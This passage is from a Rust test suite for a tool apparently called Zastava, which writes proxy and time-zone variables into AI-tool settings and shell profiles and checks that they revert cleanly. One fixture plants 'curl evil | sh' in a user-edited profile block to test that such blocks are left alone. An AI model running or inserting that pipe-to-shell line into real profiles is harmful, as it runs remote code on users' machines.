            "{{\n  \"{key}\": {{\n    \"HTTP_PROXY\": \"{URL}\",\n    \"HTTPS_PROXY\": \"{URL}\",\n    \"NO_PROXY\": \"{}\"\n  }},\n  \"a\": 1\n}}\n",
            crate::sysproxy::NO_PROXY_VALUE_2_0
        );
        let ide = e.ide_with(&text, 0o644);
        e.disable();
        let after = e.text(&ide);
        assert_eq!(raw(&after, &[key]), None, "{after}");
        assert_eq!(raw(&after, &["a"]), Some("1".into()));
    }

    // --- WP-24: independent time zone / locale, CLI mode, ~/.zshenv, no LC_ALL ---------------

    const ZONE: &str = "Europe/Berlin";
    const USER_ZSHRC: &str = "export PATH=\"$HOME/bin:$PATH\"\nalias g=git\n";

    fn json_of(e: &Env, file: &Path) -> String {
        e.fs.get(file)
            .map(|b| String::from_utf8(b).unwrap())
            .unwrap_or_else(|| "{}".to_string())
    }

    /// The block of 2.0.0: both parts, `LC_ALL` and the short `NO_PROXY`.
    fn block_2_0_0() -> String {
        build_shell_rc_guard_block_with_tz(URL, 8899, Some(ZONE))
            .replace(
                "  export LC_TIME=\"en_US.UTF-8\"",
                "  export LC_TIME=\"en_US.UTF-8\"\n  export LC_ALL=\"en_US.UTF-8\"",
            )
            .replace(NO_PROXY_VALUE, crate::sysproxy::NO_PROXY_VALUE_2_0)
    }

    fn with_block(user: &str, block: &str) -> String {
        crate::sysproxy::shell_rc::upsert_block(user, block).unwrap()
    }

    #[test]
    fn the_time_zone_switch_is_independent_of_the_proxy_protection_in_all_four_combinations() {
        crate::sysproxy::force_os_dry_run();
        for (proxy, tz) in [(true, true), (true, false), (false, true), (false, false)] {
            let e = env();
            let ide = e.ide_with("{}\n", 0o644);
            e.apply(
                proxy.then_some(URL),
                tz.then_some(ZONE),
                CliMode::AiOnly,
                HostOs::Unix,
            );
            let key = ide_env_key();
            for (text, container) in [
                (json_of(&e, &e.ctx.claude_settings()), "env"),
                (e.text(&ide), key),
            ] {
                for var in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY"] {
                    assert_eq!(raw(&text, &[container, var]).is_some(), proxy, "{var}");
                }
                for var in ["TZ", "LANG", "LC_TIME"] {
                    assert_eq!(raw(&text, &[container, var]).is_some(), tz, "{var}");
                }
                assert_eq!(raw(&text, &[container, "LC_ALL"]), None);
            }
            assert_eq!(raw(&e.text(&ide), &["http.proxy"]).is_some(), proxy);
            assert!(!e.text(&ide).contains("LC_ALL"));
        }
    }

    #[test]
    fn every_transition_between_the_four_states_ends_like_a_fresh_apply() {
        crate::sysproxy::force_os_dry_run();
        let states = [(true, true), (true, false), (false, true), (false, false)];
        for from in states {
            for to in states {
                let e = env();
                let ide = e.ide_with(COMMENTED, 0o644);
                let go = |(proxy, tz): (bool, bool)| {
                    e.apply(
                        proxy.then_some(URL),
                        tz.then_some(ZONE),
                        CliMode::AiOnly,
                        HostOs::Unix,
                    )
                };
                go(from);
                go(to);
                let fresh = env();
                let fresh_ide = fresh.ide_with(COMMENTED, 0o644);
                fresh.apply(
                    to.0.then_some(URL),
                    to.1.then_some(ZONE),
                    CliMode::AiOnly,
                    HostOs::Unix,
                );
                // The same keys and values (the order inside an object follows the history).
                let value = |t: &str| {
                    serde_json::from_str::<serde_json::Value>(&crate::sysproxy::sanitize_jsonc(
                        t.trim_start_matches('\u{feff}'),
                    ))
                    .unwrap()
                };
                assert_eq!(
                    value(&e.text(&ide)),
                    value(&fresh.text(&fresh_ide)),
                    "{from:?} -> {to:?}"
                );
                assert_eq!(
                    e.fs.get(&e.ctx.claude_settings())
                        .map(|b| value(&String::from_utf8(b).unwrap())),
                    fresh
                        .fs
                        .get(&fresh.ctx.claude_settings())
                        .map(|b| value(&String::from_utf8(b).unwrap())),
                    "{from:?} -> {to:?}"
                );
                // And everything goes back byte for byte.
                e.disable();
                assert_eq!(e.text(&ide), COMMENTED, "{from:?} -> {to:?}");
                assert!(e.fs.get(&e.ctx.claude_settings()).is_none());
            }
        }
    }

    #[test]
    fn switching_the_proxy_off_keeps_the_time_zone_keys_and_the_objects_they_live_in() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let ide = e.ide_with("{}\n", 0o644);
        e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        e.apply(None, Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        let text = e.text(&ide);
        assert_eq!(raw(&text, &["http.proxy"]), None);
        assert_eq!(raw(&text, &[ide_env_key(), "HTTPS_PROXY"]), None);
        assert_eq!(raw(&text, &[ide_env_key(), "TZ"]), Some(json_str(ZONE)));
        assert_eq!(
            raw(&text, &[ide_env_key(), "LANG"]),
            Some(json_str("en_US.UTF-8"))
        );
        // Then the zone goes too: the object Zastava made is gone and the file is as it was.
        e.apply(None, None, CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&ide), "{}\n");
        assert!(e.fs.get(&e.ctx.claude_settings()).is_none());
        assert!(e.journal_is_empty());
    }

    #[test]
    fn ai_only_writes_nothing_into_shell_or_powershell_profiles_or_the_os() {
        crate::sysproxy::force_os_dry_run();
        for os in [HostOs::Unix, HostOs::Windows] {
            let e = env();
            let mut profiles = vec![
                e.ctx.home.join(".zshrc"),
                e.ctx.home.join(".bash_profile"),
                e.ctx.home.join(".zshenv"),
            ];
            profiles.extend(e.ctx.powershell_profiles());
            for f in &profiles {
                e.fs.put(f, USER_ZSHRC.as_bytes(), 0o600);
            }
            e.ide_with("{}\n", 0o644);
            let applied = e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, os);
            assert!(applied.targets.contains(&"Claude Code".to_string()));
            assert!(applied.targets.contains(&"VS Code".to_string()));
            assert!(
                !applied
                    .targets
                    .iter()
                    .any(|t| t.contains("Терминал") || t.contains("PowerShell"))
            );
            for f in &profiles {
                assert_eq!(e.text(f), USER_ZSHRC, "{f:?} is untouched");
            }
            assert_eq!(
                e.p.os_writes(),
                0,
                "no launchctl / registry / networksetup write"
            );
            assert!(
                !e.journal()
                    .entries()
                    .iter()
                    .any(|en| matches!(en.resource, Resource::TextBlock { .. })),
                "no block is recorded"
            );
        }
    }

    #[test]
    fn global_terminal_adds_the_blocks_on_unix_and_in_powershell() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        e.fs.put(&e.ctx.home.join(".zshrc"), USER_ZSHRC.as_bytes(), 0o600);
        let a = e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        assert!(a.targets.contains(&"Терминал (~/.zshrc)".to_string()));
        assert!(
            e.text(&e.ctx.home.join(".zshrc"))
                .contains("export HTTPS_PROXY=")
        );
        assert!(e.fs.get(&e.ctx.home.join(".zshenv")).is_none());

        let w = env();
        let a = w.apply(
            Some(URL),
            Some(ZONE),
            CliMode::GlobalTerminal,
            HostOs::Windows,
        );
        assert!(a.targets.contains(&"PowerShell ($PROFILE)".to_string()));
        for ps in w.ctx.powershell_profiles() {
            let t = w.text(&ps);
            assert!(t.contains("$env:HTTPS_PROXY") && t.contains("$env:TZ = \"Europe/Berlin\""));
            assert!(t.contains("$env:LANG") && t.contains("$env:LC_TIME") && !t.contains("LC_ALL"));
        }
        assert!(
            w.fs.get(&w.ctx.home.join(".zshrc")).is_none(),
            "no unix profile on Windows"
        );
    }

    #[test]
    fn a_terminal_block_carries_only_the_parts_that_are_on() {
        crate::sysproxy::force_os_dry_run();
        // Time zone only, in global_terminal: no proxy variable anywhere in the block.
        let e = env();
        e.apply(None, Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        let rc = e.text(&e.ctx.home.join(".zshrc"));
        assert!(rc.contains("export TZ=\"Europe/Berlin\"") && rc.contains("export LC_TIME="));
        assert!(!rc.contains("PROXY") && !rc.contains("proxy"), "{rc}");
        // Proxy only: no TZ / LANG / LC_TIME.
        let e = env();
        e.apply(Some(URL), None, CliMode::GlobalTerminal, HostOs::Unix);
        let rc = e.text(&e.ctx.home.join(".zshrc"));
        assert!(rc.contains("export HTTPS_PROXY=") && !rc.contains("TZ") && !rc.contains("LANG"));
        // PowerShell: the locale variables only together with a zone.
        let ps = build_powershell_block(8899, Some(URL), None);
        assert!(!ps.contains("LANG") && !ps.contains("LC_TIME") && !ps.contains("TZ"));
        let ps = build_powershell_block(8899, None, Some(ZONE));
        assert!(ps.contains("$env:LANG") && !ps.contains("PROXY"));
        assert!(is_generated_block(&ps));
        assert!(is_generated_block(&build_shell_block(
            8899,
            None,
            Some(ZONE)
        )));
    }

    #[test]
    fn switching_the_mode_back_and_forth_is_byte_for_byte() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let ide = e.ide_with(COMMENTED, 0o640);
        let zshrc = e.ctx.home.join(".zshrc");
        let bash = e.ctx.home.join(".bash_profile");
        e.fs.put(&zshrc, USER_ZSHRC.as_bytes(), 0o600);
        e.fs.put(&bash, b"# bash\r\nexport B=1\r\n", 0o644);
        let go = |mode| e.apply(Some(URL), Some(ZONE), mode, HostOs::Unix);

        go(CliMode::AiOnly);
        assert_eq!(e.text(&zshrc), USER_ZSHRC);
        go(CliMode::GlobalTerminal);
        let global = (e.text(&zshrc), e.text(&bash), e.text(&ide));
        assert!(global.0.contains(ZASTAVA_RC_START) && global.1.contains(ZASTAVA_RC_START));
        assert!(global.1.contains("\r\n"), "CRLF profile keeps CRLF");
        go(CliMode::AiOnly);
        assert_eq!(
            e.text(&zshrc),
            USER_ZSHRC,
            "the block is given back exactly"
        );
        assert_eq!(e.text(&bash), "# bash\r\nexport B=1\r\n");
        go(CliMode::GlobalTerminal);
        assert_eq!(
            (e.text(&zshrc), e.text(&bash), e.text(&ide)),
            global,
            "same bytes again"
        );
        e.disable();
        assert_eq!(e.text(&zshrc), USER_ZSHRC);
        assert_eq!(e.text(&bash), "# bash\r\nexport B=1\r\n");
        assert_eq!(e.text(&ide), COMMENTED);
        assert!(e.journal_is_empty());
    }

    #[test]
    fn a_profile_zastava_created_goes_away_when_the_mode_returns_to_ai_only() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        e.apply(Some(URL), None, CliMode::GlobalTerminal, HostOs::Unix);
        assert!(e.fs.get(&e.ctx.home.join(".zshrc")).is_some());
        e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
        assert!(e.fs.get(&e.ctx.home.join(".zshrc")).is_none());
    }

    // ~/.zshenv: never written, an old block is cut out by its exact markers.

    #[test]
    fn zshenv_is_never_written_and_an_old_block_is_cut_out_with_the_bytes_around_it() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        let user = "# env\r\nexport A=1\r\n";
        let tail = "export Z=9\r\n";
        e.fs.put(
            &zshenv,
            format!(
                "{user}\r\n{}\r\n{tail}",
                block_2_0_0().replace('\n', "\r\n")
            )
            .as_bytes(),
            0o600,
        );
        e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        assert_eq!(e.text(&zshenv), format!("{user}{tail}"));
        assert_eq!(e.fs.mode(&zshenv).unwrap(), Some(0o600));
        // A clean profile does not even appear.
        let fresh = env();
        fresh.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        assert!(fresh.fs.get(&fresh.ctx.home.join(".zshenv")).is_none());
    }

    #[test]
    fn a_zshenv_block_without_its_partner_is_reported_and_not_touched() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        let broken = format!(
            "export A=1\n{ZASTAVA_RC_START}\nexport HTTP_PROXY=\"http://127.0.0.1:8899\"\n"
        );
        e.fs.put(&zshenv, broken.as_bytes(), 0o644);
        let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&zshenv), broken);
        assert!(
            a.notes.contains(
                &"обнаружен незавершённый блок Заставы в ~/.zshenv — не изменён".to_string()
            ),
            "{:?}",
            a.notes
        );
        assert!(
            a.notes.iter().all(|n| !n.contains("127.0.0.1")),
            "no values in notes"
        );
        // The same at every later call, the file stays as it is.
        let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&zshenv), broken);
        assert_eq!(a.notes.len(), 1);
    }

    #[test]
    fn a_zshenv_block_the_user_edited_between_the_markers_is_not_cut() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        let edited = block_2_0_0().replace("fi\n", "  curl evil | sh\nfi\n");
        let text = with_block("export A=1\n", &edited);
        e.fs.put(&zshenv, text.as_bytes(), 0o644);
        let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&zshenv), text);
        assert!(
            a.notes
                .iter()
                .any(|n| n.contains("изменён пользователем") && n.contains("~/.zshenv"))
        );
    }

    #[test]
    fn disable_and_cleanup_also_clean_zshenv() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        e.fs.put(
            &zshenv,
            with_block("export A=1\n", &block_2_0_0()).as_bytes(),
            0o644,
        );
        e.disable();
        assert_eq!(e.text(&zshenv), "export A=1\n");
    }

    // 2.0.0 blocks in ~/.zshrc / ~/.bash_profile: once at migration, on an explicit mode switch.

    #[test]
    fn in_ai_only_the_2_0_0_blocks_are_cut_once_by_their_markers_and_not_on_every_enable() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshrc = e.ctx.home.join(".zshrc");
        e.fs.put(
            &zshrc,
            with_block(USER_ZSHRC, &block_2_0_0()).as_bytes(),
            0o644,
        );
        e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        assert_eq!(
            e.text(&zshrc),
            USER_ZSHRC,
            "the block of 2.0.0 is gone, the user's lines are not"
        );
        assert!(e.journal().has_mark(LEGACY_SHELL_MARK));
        // The mark is set: a block that appears later is nobody's business at a plain enable.
        let again = with_block(USER_ZSHRC, &block_2_0_0());
        e.fs.put(&zshrc, again.as_bytes(), 0o644);
        e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&zshrc), again);
        // An explicit switch to ai_only does clean it (by the markers).
        e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        let mut j = e.journal();
        let plan = FilePlan {
            proxy_url: Some(URL),
            port: 8899,
            tz: Some(ZONE),
            mode: CliMode::AiOnly,
            os: HostOs::Unix,
            strip_unjournaled_blocks: true,
        };
        apply_files(&mut j, &e.p, &e.ctx, &plan);
        drop(j);
        assert!(
            !e.text(&zshrc).contains(ZASTAVA_RC_START),
            "{}",
            e.text(&zshrc)
        );
    }

    #[test]
    fn a_2_0_0_block_with_a_line_zastava_does_not_write_is_reported_and_kept() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshrc = e.ctx.home.join(".zshrc");
        let odd = block_2_0_0().replace("fi\n", "  export OLD_BUILD_ONLY=1\nfi\n");
        let text = with_block(USER_ZSHRC, &odd);
        e.fs.put(&zshrc, text.as_bytes(), 0o644);
        let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
        assert_eq!(e.text(&zshrc), text);
        assert!(
            a.notes.iter().any(|n| n.contains("~/.zshrc")),
            "{:?}",
            a.notes
        );
        assert!(
            !e.journal().has_mark(LEGACY_SHELL_MARK),
            "reported again, not silenced"
        );
    }

    // LC_ALL: never written, only recognised as a leftover.

    #[test]
    fn lc_all_is_in_no_output_of_any_writer() {
        crate::sysproxy::force_os_dry_run();
        for (proxy, tz, mode) in [
            (true, true, CliMode::AiOnly),
            (true, true, CliMode::GlobalTerminal),
            (false, true, CliMode::GlobalTerminal),
        ] {
            for os in [HostOs::Unix, HostOs::Windows] {
                let e = env();
                let ide = e.ide_with("{}\n", 0o644);
                e.fs.create_private_dir_all(&e.ctx.home.join(".gemini"))
                    .unwrap();
                e.apply(proxy.then_some(URL), tz.then_some(ZONE), mode, os);
                let mut files = vec![ide, e.ctx.claude_settings(), e.ctx.gemini_settings()];
                files.push(e.ctx.home.join(".zshrc"));
                files.extend(e.ctx.powershell_profiles());
                for f in files {
                    if let Some(b) = e.fs.get(&f) {
                        assert!(!String::from_utf8(b).unwrap().contains("LC_ALL"), "{f:?}");
                    }
                }
            }
        }
        let report = finish_enable(
            &SysState::new(),
            Run::Done(FilesApplied::default()),
            (URL.to_string(), 8899),
            Some(ZONE.to_string()),
            CliMode::AiOnly,
        );
        assert!(!report.shell_command.contains("LC_ALL"));
        assert!(
            report.shell_command.contains("LANG=") && report.shell_command.contains("LC_TIME=")
        );
        assert!(!build_shell_block(8899, Some(URL), Some(ZONE)).contains("LC_ALL"));
        assert!(!build_powershell_block(8899, Some(URL), Some(ZONE)).contains("LC_ALL"));
    }

    #[test]
    fn an_lc_all_key_an_earlier_build_recorded_is_given_back_when_the_zone_is_applied() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let claude = e.ctx.claude_settings();
        let mut j = e.journal();
        let keys = [
            crate::sysproxy::ide::KeySpec::new(&["env", "LC_ALL"], "en_US.UTF-8"),
            crate::sysproxy::ide::KeySpec::new(&["env", "TZ"], "Europe/Paris"),
        ];
        crate::sysproxy::ide::apply_settings_keys(&mut j, &e.p, &*e.ctx.fs, &claude, &keys, &[])
            .unwrap();
        drop(j);
        e.apply(None, Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        let text = e.text(&claude);
        assert_eq!(raw(&text, &["env", "LC_ALL"]), None);
        assert_eq!(raw(&text, &["env", "TZ"]), Some(json_str(ZONE)));
    }

    // Migration by signature: strict parse, values checked.

    fn legacy_run(e: &Env, file: &Path, gw: Option<u16>) -> bool {
        let j = e.journal();
        clean_legacy_json(&j, &*e.ctx.fs, file, false, &["env"], gw)
    }

    #[test]
    fn a_russian_locale_next_to_a_signed_proxy_stays_and_the_zone_goes_only_with_the_signature() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let f = e.ctx.claude_settings();
        let text = format!(
            "{{\n  \"env\": {{\n    \"HTTPS_PROXY\": \"{URL}\",\n    \"TZ\": \"Europe/Berlin\",\n    \"LANG\": \"ru_RU.UTF-8\",\n    \"LC_TIME\": \"en_US.UTF-8\",\n    \"LC_ALL\": \"ru_RU.UTF-8\"\n  }}\n}}\n"
        );
        e.fs.put(&f, text.as_bytes(), 0o644);
        assert!(legacy_run(&e, &f, None));
        let after = e.text(&f);
        assert_eq!(raw(&after, &["env", "HTTPS_PROXY"]), None);
        assert_eq!(raw(&after, &["env", "TZ"]), None, "co-signed zone");
        assert_eq!(
            raw(&after, &["env", "LC_TIME"]),
            None,
            "the value Zastava wrote"
        );
        assert_eq!(raw(&after, &["env", "LANG"]), Some(json_str("ru_RU.UTF-8")));
        assert_eq!(
            raw(&after, &["env", "LC_ALL"]),
            Some(json_str("ru_RU.UTF-8"))
        );

        // No signed proxy variable: nothing is ours, not even a well-formed zone.
        let own = "{\n  \"env\": {\n    \"HTTPS_PROXY\": \"http://corp:3128\",\n    \"TZ\": \"Europe/Berlin\",\n    \"LC_ALL\": \"en_US.UTF-8\"\n  }\n}\n";
        e.fs.put(&f, own.as_bytes(), 0o644);
        assert!(legacy_run(&e, &f, None));
        assert_eq!(e.text(&f), own);
    }

    #[test]
    fn the_signature_is_the_strict_one_userinfo_lookalike_hosts_and_the_gateway_port() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let f = e.ctx.claude_settings();
        for (value, gw, removed) in [
            ("http://user:pw@127.0.0.1:8899", None, false),
            ("http://my-localhost:8900", None, false),
            ("http://127.0.0.1:88990", None, false),
            ("http://127.0.0.1:9123", None, false),
            ("http://127.0.0.1:9123", Some(9123), true),
            ("http://localhost:8900", None, true),
            ("127.0.0.1:8899", None, true),
        ] {
            let text = format!(
                "{{\n  \"env\": {{\n    \"HTTPS_PROXY\": \"{value}\",\n    \"TZ\": \"Asia/Tokyo\"\n  }}\n}}\n"
            );
            e.fs.put(&f, text.as_bytes(), 0o644);
            assert!(legacy_run(&e, &f, gw));
            let after = e.text(&f);
            assert_eq!(
                raw(&after, &["env", "HTTPS_PROXY"]).is_none(),
                removed,
                "{value}"
            );
            assert_eq!(raw(&after, &["env", "TZ"]).is_none(), removed, "{value}");
        }
    }

    #[test]
    fn the_status_uses_the_same_strict_signature_and_ignores_the_time_zone_keys() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let f = e.ctx.claude_settings();
        let put = |v: &str| {
            e.fs.put(
                &f,
                format!("{{\"env\": {{\"HTTPS_PROXY\": \"{v}\"}}}}").as_bytes(),
                0o644,
            )
        };
        put(URL);
        assert!(files_show_protection(&e.ctx));
        put("http://u@127.0.0.1:8899");
        assert!(
            !files_show_protection(&e.ctx),
            "userinfo is not our address"
        );
        put("http://my-localhost:8900");
        assert!(!files_show_protection(&e.ctx));
        // Time zone keys alone are not "protection".
        e.fs.put(&f, b"{\"env\": {\"TZ\": \"Europe/Berlin\", \"LANG\": \"en_US.UTF-8\", \"LC_TIME\": \"en_US.UTF-8\"}}", 0o644);
        assert!(!files_show_protection(&e.ctx));
        assert!(files_show_tz_sync(&e.ctx));
    }

    #[test]
    fn the_status_of_a_terminal_block_is_the_proxy_part_only() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        e.apply(None, Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        assert!(
            !files_show_protection(&e.ctx),
            "a zone-only block is not protection"
        );
        assert!(files_show_tz_sync(&e.ctx));
        e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
        assert!(files_show_protection(&e.ctx));
        e.apply(Some(URL), None, CliMode::GlobalTerminal, HostOs::Unix);
        assert!(files_show_protection(&e.ctx));
        assert!(
            !files_show_tz_sync(&e.ctx),
            "proxy without a zone says nothing about the locale"
        );
    }

    // Run::Failed (journal busy / damaged): nothing is on.

    #[test]
    fn a_refused_journal_means_not_enabled_and_no_active_flag() {
        use crate::sysproxy::journal::JournalError;
        for err in [
            JournalError::Locked,
            JournalError::Corrupt,
            JournalError::UnknownSchema(99),
        ] {
            let st = SysState::new();
            let report = finish_enable(
                &st,
                Run::Failed(err),
                (URL.to_string(), 8899),
                Some(ZONE.to_string()),
                CliMode::AiOnly,
            );
            assert!(!report.enabled);
            assert!(report.configured_targets.is_empty() && report.shell_command.is_empty());
            assert!(
                report
                    .error
                    .as_deref()
                    .is_some_and(|t| t.starts_with("Защита не включена"))
            );
            assert!(!st.cli_protection_active());
            assert_eq!(st.cli_proxy(), None);
            assert_eq!(st.cli_tz(), None);
        }
        let st = SysState::new();
        let ok = finish_enable(
            &st,
            Run::Done(FilesApplied::default()),
            (URL.to_string(), 8899),
            None,
            CliMode::GlobalTerminal,
        );
        assert!(ok.enabled && ok.error.is_none());
        assert!(st.cli_protection_active());
        assert_eq!(st.cli_proxy(), Some((URL.to_string(), 8899)));
        assert_eq!(st.cli_mode(), CliMode::GlobalTerminal);
    }

    #[test]
    fn a_refused_journal_on_apply_changes_nothing_and_a_refused_disable_is_a_failure() {
        use crate::sysproxy::journal::JournalError;
        let st = SysState::new();
        st.set_cli_tz(Some("Asia/Tokyo".into()));
        let r = finish_apply(
            &st,
            Run::Failed(JournalError::Locked),
            Some(ZONE.into()),
            CliMode::GlobalTerminal,
        );
        assert!(!r.ok && r.error.is_some());
        assert_eq!(st.cli_tz().as_deref(), Some("Asia/Tokyo"));
        assert_eq!(st.cli_mode(), CliMode::AiOnly);

        st.set_cli_protection_active(true);
        let mut report = RecoveryReport::default();
        finish_disable(&st, Run::Failed(JournalError::Corrupt), &mut report);
        assert!(report.has_failures());
        assert!(st.cli_protection_active(), "nothing was put back: still on");
        let mut report = RecoveryReport::default();
        finish_disable(&st, Run::Done(FilesApplied::default()), &mut report);
        assert!(!report.has_failures());
        assert!(!st.cli_protection_active());
    }

    #[test]
    fn the_runtime_state_forgets_proxy_and_zone_on_reset_but_keeps_the_mode() {
        let st = SysState::new();
        st.set_cli_proxy(Some((URL.into(), 8899)));
        st.set_cli_tz(Some(ZONE.into()));
        st.set_cli_mode(CliMode::GlobalTerminal);
        st.reset();
        assert_eq!((st.cli_proxy(), st.cli_tz()), (None, None));
        assert_eq!(st.cli_mode(), CliMode::GlobalTerminal);
    }

    #[test]
    fn notes_and_errors_carry_no_values_or_home_paths() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        e.fs.put(
            &zshenv,
            format!("{ZASTAVA_RC_START}\nexport HTTP_PROXY=\"http://u:secret@127.0.0.1:8899\"\n")
                .as_bytes(),
            0o644,
        );
        let a = e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        for n in &a.notes {
            assert!(
                !n.contains("secret") && !n.contains("/home/u") && !n.contains("8899"),
                "{n}"
            );
        }
    }

    #[test]
    fn a_zshenv_block_an_early_2_1_build_recorded_is_given_back_through_the_journal() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let zshenv = e.ctx.home.join(".zshenv");
        e.fs.put(&zshenv, b"export A=1\n", 0o600);
        let mut j = e.journal();
        let block = build_shell_rc_guard_block_with_tz(URL, 8899, None);
        apply_profile_block(&mut j, &e.p, &*e.ctx.fs, &zshenv, &block).unwrap();
        assert!(e.text(&zshenv).contains(ZASTAVA_RC_START));
        let (strip, _) = clean_zshenv(&mut j, &e.p, &e.ctx);
        assert_eq!(strip, Strip::Absent);
        drop(j);
        assert_eq!(e.text(&zshenv), "export A=1\n");
        assert!(e.journal_is_empty());
    }

    #[test]
    fn enable_without_a_proxy_in_ai_only_is_only_a_zone_apply_and_names_no_terminal() {
        crate::sysproxy::force_os_dry_run();
        let e = env();
        let a = e.apply(None, Some(ZONE), CliMode::AiOnly, HostOs::Unix);
        assert_eq!(a.targets, vec!["Claude Code".to_string()]);
        let none = e.apply(None, None, CliMode::AiOnly, HostOs::Unix);
        assert!(none.targets.is_empty());
        assert!(e.journal_is_empty());
    }
}
